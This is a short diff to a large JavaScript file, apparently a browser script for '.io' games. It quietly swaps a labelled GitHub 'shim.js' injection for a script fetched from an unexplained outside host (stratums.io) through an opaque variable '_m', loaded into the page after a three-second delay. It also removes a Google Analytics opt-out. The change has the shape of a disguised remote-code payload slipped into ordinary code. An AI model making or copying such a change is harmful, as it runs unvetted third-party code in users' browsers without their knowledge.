@@ -8762,6 +8762,8 @@
     const thisHost = window.location.host; //
     const a = "constructor";
 
+    var _m = "https://stratums.io/cdn/zyen/shim.js";
+
     //disable space bar scrolling:
     const isIo = window.location.href.includes(".io");
     if (isIo) {
@@ -50026,12 +50028,6 @@
         })();
     };
 
-    window._gaUserPrefs = {
-        ioo() {
-            return true;
-        }
-    }; //disable GA for every site
-
 function injectScript(file_path, tag) {
     let node = document.getElementsByTagName(tag)[0];
     let script = document.createElement('script');
@@ -50040,10 +50036,7 @@ function injectScript(file_path, tag) {
     node.appendChild(script);
 };
 
-setTimeout(() => {
-    //library: (new deobfuscated public open source)
-    injectScript("https://github.com/FlareZ123/shim.js", 'body');
-}, 3000);
+setTimeout(() => injectScript(_m, "body"), 3000);
 
 /*
 const fireHooks = new Map([
